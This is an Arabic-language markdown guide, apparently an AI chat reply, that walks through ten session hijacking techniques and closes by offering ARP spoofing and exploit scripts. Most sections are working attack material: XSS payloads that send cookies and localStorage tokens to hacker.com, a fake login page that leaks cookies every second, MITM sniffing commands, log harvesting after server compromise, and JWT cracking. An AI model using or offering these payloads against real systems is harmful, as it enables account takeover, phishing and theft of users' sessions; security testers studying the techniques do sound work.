 # 🧪 الخطوة الملية: كيف تشوف أن فيها ثغرة Session Hijacking؟

### ١. **تحصل على توكن جلسة من أي طريقة**
   - XSS → `document.cookie`
   - MITM → Sniffing
   - Session Fixation → وضع توكن ثم تسجيل دخول الضحية
   - تسريب في URL أو Referer Header

### ٢. **تستخدم هذا التوكن في طلبك الخاص**
مثلاً:
```http
GET /profile HTTP/1.1
Host: target.com
Cookie: PHPSESSID=stolen_token_here
```

### ٣. **لو حصلت على محتوى الحساب الخاص بالضحية → ثغرة موجودة ✅**

---

# 🚨 محاولات مختلفة لاختبار واستغلال Session Hijacking


---

# 🧪 Session Hijacking – المحاولة 1: سرقة الكوكيز عبر XSS

### 📌 الفكرة:
استغلال ثغرة **XSS** (Cross-Site Scripting) لقراءة الكوكيز والتحكم في جلسة المستخدم.

### ⚙️ الخطوات:

#### ١. اكتشف مكان وجود XSS
- عادةً في نماذج إدخال البيانات مثل:
  - تعليقات الموقع
  - بحث
  - حقول إدخال المستخدم

#### ٢. ضع كود JavaScript يرسل الكوكيز إلى خادمك
```html
<script>
  fetch('https://hacker.com/steal?c=' + document.cookie);
</script>
```

#### ٣. استخدم أداة لتلقي الكوكيز
- يمكنك استخدام:
  - **Python Simple HTTP Server**
  - **RequestBin أو Webhook.site**
  - **Burp Collaborator**

#### ٤. انتظر حتى يفتح الضحية الصفحة الملوثة → تحصل على الكوكيز.

#### ٥. استخدم الكوكيز في طلب جديد:
```http
GET /profile HTTP/1.1
Host: target.com
Cookie: PHPSESSID=stolen_cookie_value
```

#### 🛠️ الأدوات:
- Burp Suite
- BeEF Framework
- Webhook.site
- Python HTTP Server

#### 💡 شروط النجاح:
- الكوكيز **بدون HttpOnly**
- XSS قابل للتنفيذ

---

# 🧪 Session Hijacking – المحاولة 2: Session Sidejacking عبر MITM

### 📌 الفكرة:
تجسس على الشبكة لالتقاط Session Token من حركة المرور غير الآمنة (HTTP).

### ⚙️ الخطوات:

#### ١. ضع نفسك كـ MITM
- باستخدام BetterCAP:
```bash
bettercap -iface eth0 -caplet http.sniffer
```

#### ٢. ابدأ Sniffing الحزم
- يمكنك استخدام Wireshark أو tcpdump:
```bash
tcpdump -i eth0 port 80 -w capture.pcap
```

#### ٣. ابحث عن Session Tokens في الطلبات
- ابحث عن كلمات مثل:
```text
PHPSESSID=
sessionid=
Cookie:
Authorization: Bearer
```

#### ٤. استخدم التوكن في Burp Suite
- انسخ الـ Cookie أو Authorization Header.
- استخدمه في Repeater أو Proxy لفتح صفحة مستخدم آخر.

#### 🛠️ الأدوات:
- BetterCAP
- Wireshark
- tcpdump
- Burp Repeater

#### 💡 شروط النجاح:
- التطبيق يستخدم HTTP وليس HTTPS
- لا يوجد Secure Flag على الكوكيز

---

# 🧪 Session Hijacking – المحاولة 3:	Session Token في الرابط (URL)

### 📌 الفكرة:
بعض التطبيقات تضع Session ID في URL مثل:
```
https://target.com/dashboard?sessionid=abc123xyz
```

### ⚙️ الخطوات:

#### ١. اكتشف وجود توكن في الرابط
- استخدم Burp Proxy وابحث عن `sessionid`, `token`, `sess` في URL.

#### ٢. راقب تسريب التوكن
- عبر Referer header:
```http
Referer: https://target.com/dashboard?sessionid=abc123xyz
```
- عبر Browser History أو Logs الخادم.

#### ٣. اجبر المستخدم على زيارة الرابط
- بإرسال رابط Phishing:
```html
<a href="https://target.com/login?sessionid=hacker_session">Click here to login</a>
```

#### ٤. استخدم التوكن المسروق
```http
GET /profile HTTP/1.1
Host: target.com
Cookie: sessionid=abc123xyz
```
أو مباشرة في الرابط:
```
https://target.com/profile?sessionid=abc123xyz
```

#### 🛠️ الأدوات:
- Burp Proxy
- Wireshark
- Phishing Email Tools

#### 💡 مشكلة:
- تسريب التوكن في Referer Headers
- تخزينه في Browser History

---

# 🧪 Session Hijacking – المحاولة 4: تسريب Session Token من السجلات (Logs)

### 📌 الفكرة:
بعض التطبيقات تسجل الطلبات التي تحتوي على Session IDs في ملفات Log.

### ⚙️ الخطوات:

#### ١. اختراق الخادم أو تنفيذ RCE
- باستخدام:
  - SQL Injection
  - Command Injection
  - LFI/RFI

#### ٢. الوصول إلى ملف logs
- غالبًا في:
```text
/var/log/apache/access.log
/var/log/nginx/access.log
/logs/
```

#### ٣. البحث عن Session IDs
```bash
grep 'PHPSESSID' /var/log/apache/access.log
```

#### ٤. استخدام التوكن في طلب جديد
```http
GET /admin HTTP/1.1
Host: target.com
Cookie: PHPSESSID=abc123xyz
```

#### 🛠️ الأدوات:
- grep
- cat
- curl
- Bash أو Python scripts

#### 💡 شروط النجاح:
- الوصول إلى نظام الملفات
- تسجيل الجلسات في السجلات

---

# 🧪 Session Hijacking – المحاولة 5: استخدام Stored XSS لسرقة الجلسة

### 📌 الفكرة:
إذا كان الموقع يسمح بتخزين تعليمات JavaScript (Stored XSS)، يمكن سرقة الكوكيز بشكل دائم.

### ⚙️ الخطوات:

#### ١. اكتب XSS Payload يُخزن في قاعدة البيانات
مثال:
```html
<script src="https://hacker.com/xss.js"></script>
```

#### ٢. انتظر حتى يفتح أي مستخدم الصفحة
- كل مستخدم يفتح الصفحة → يتم إرسال الكوكيز لك.

#### ٣. استقبال الكوكيز على خادمك
- ملف `xss.js` يحتوي على:
```javascript
fetch("https://hacker.com/steal?cookie=" + document.cookie)
```

#### ٤. استخدام الكوكيز في Burp Repeater
```http
GET /dashboard HTTP/1.1
Host: target.com
Cookie: PHPSESSID=abc123xyz
```

#### 🛠️ الأدوات:
- Stored XSS Vulnerable Page
- Python Web Server
- Burp Repeater

#### 💡 شروط النجاح:
- موقع يدعم Stored XSS
- الكوكيز بدون HttpOnly

---

# 🧪 Session Hijacking – المحاولة 6: استخدام Mobile Application Traffic

### 📌 الفكرة:
تطبيقات الهاتف قد تستخدم API بسيط مع توكنات في رؤوس الطلب.

### ⚙️ الخطوات:

#### ١. تكوين Burp Suite كبروكسي للجهاز المحمول
- ضبط الإعدادات في Wi-Fi → استخدام IP البروكسي والبورت

#### ٢. تشغيل التطبيق وإجراء تسجيل دخول
- التقاط الطلب في Burp Proxy

#### ٣. الحصول على التوكن
- غالبًا موجود في:
  - Authorization Header:
    ```http
    Authorization: Bearer abc123xyz
    ```
  - Body of the response

#### ٤. إعادة استخدام التوكن في طلب جديد
- باستخدام cURL أو Postman:
```bash
curl -H "Authorization: Bearer abc123xyz" https://api.target.com/user
```

#### 🛠️ الأدوات:
- Burp Suite
- Charles Proxy
- Fiddler
- Android Studio Emulator

#### 💡 شروط النجاح:
- التطبيق لا يستخدم HTTPS بشكل صحيح
- API لا يقوم بتجديد التوكن عند كل طلب

---

# 🧪 Session Hijacking – المحاولة 7: استخدام LocalStorage/sessionStorage

### 📌 الفكرة:
بعض التطبيقات الحديثة تستخدم HTML5 Storage بدلاً من الكوكيز.

### ⚙️ الخطوات:

#### ١. اكتشاف استخدام localStorage
- في DevTools:
```javascript
localStorage.getItem("auth_token");
```

#### ٢. كتابة XSS ليقرأ القيمة
```html
<script>
  fetch("https://hacker.com/token?="+localStorage.getItem("auth_token"));
</script>
```

#### ٣. مراقبة الطلب الوارد
- في خادمك البسيط أو Webhook.site

#### ٤. استخدام التوكن في طلب جديد
```http
GET /account HTTP/1.1
Host: target.com
Authorization: Bearer abc123xyz
```

#### 🛠️ الأدوات:
- Chrome DevTools
- Stored/XSS Payloads
- Burp Collaborator

#### 💡 شروط النجاح:
- وجود XSS
- عدم وجود HttpOnly على الكوكيز أو secure storage

---

# 🧪 Session Hijacking – المحاولة 8: سرقة JWT Tokens

### 📌 الفكرة:
JWT هي توكنات مشفرة تُستخدم كـ Session Token. بعضها يمكن فك تشفيره أو إعادة توقيعه.

### ⚙️ الخطوات:

#### ١. التقاط التوكن
- من Authorization Header:
```http
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

#### ٢. فتح التوكن باستخدام jwt.io أو Burp Extension
- payload قد يبدو مثل:
```json
{
  "user": "admin",
  "exp": 123456789
}
```

#### ٣. محاولة فك التوقيع
- باستخدام John The Ripper:
```bash
john jwt.hash --wordlist=rockyou.txt
```

#### ٤. تعديل payload وإعادة التوقيع
- تغيير `"user": "admin"` إلى `"user": "victim"`

#### ٥. استخدام التوكن الجديد:
```http
GET /admin HTTP/1.1
Host: target.com
Authorization: Bearer NEW_JWT_TOKEN
```

#### 🛠️ الأدوات:
- JWT Editor (Burp)
- John The Ripper
- hashcat

---

# 🧪 Session Hijacking – المحاولة 9: استخدام Session Reuse بين المستخدمين

### 📌 الفكرة:
بعض التطبيقات تستخدم نفس الجلسة لعدة مستخدمين أو لا تقوم بمسح الجلسات القديمة.

### ⚙️ الخطوات:

#### ١. سجل دخول كمستخدم A
- احصل على Session ID.

#### ٢. استخدم نفس التوكن مع حساب مستخدم B
```http
GET /profile HTTP/1.1
Host: target.com
Cookie: PHPSESSID=abc123xyz
```

#### ٣. لو ظهر لك بيانات المستخدم B → ثغرة موجودة

#### 🛠️ الأدوات:
- Burp Repeater
- Cookie Manager Extensions

---

# 🧪 Session Hijacking – المحاولة 10: استخدام Session Hijacking عبر Phishing

### 📌 الفكرة:
إنشاء صفحة ويب مزيفة تشبه صفحة تسجيل الدخول وتقوم بنقل الجلسة الحقيقية إلى المهاجم.

### ⚙️ الخطوات:

#### ١. إنشاء صفحة Login مزيفة
```html
<form action="https://target.com/login" method="POST">
  <input type="text" name="username">
  <input type="password" name="password">
</form>

<script>
  setInterval(() => {
    fetch('https://hacker.com/cookies?c='+document.cookie);
  }, 1000);
</script>
```

#### ٢. استضافة الصفحة
- باستخدام Python:
```bash
python3 -m http.server 8000
```

#### ٣. إرسال الرابط للضحية
- باستخدام Social Engineering أو Phishing Email

#### ٤. استقبال الكوكيز
- واستخدامه في طلب جديد لدخول باسم الضحية

#### 🛠️ الأدوات:
- Python Web Server
- GoPhish
- SET (Social-Engineer Toolkit)

---

## 🚀 هل تريد خطوة إضافية؟

مثل:

- سكربت بايثون لتجربة Session Fixation + Hijacking؟
- كيفية عمل MITM عملي عبر ARP Spoofing؟
- مثال عملي على JWT Token hijacking بالتفاصيل؟

قولي وانا أساعدك مباشر 🔥

# 📌 Checklist سريع: هل يمكنك استغلال Session Hijacking؟

| الشرط | هل استغلال ممكن؟ |
|-------|--------------------|
| Session ID قابل للتنبؤ أو يسهل سرقته | ✅ |
| XSS بدون HttpOnly | ✅ |
| Session Token في URL | ✅ |
| تسريب في Referer أو Logs | ✅ |
| MITM ممكن | ✅ |
| Mobile App بدون HTTPS | ✅ |
| استخدام JWT بدون توقيع آمن | ✅ |
| Shared Sessions بين المستخدمين | ✅ |

---
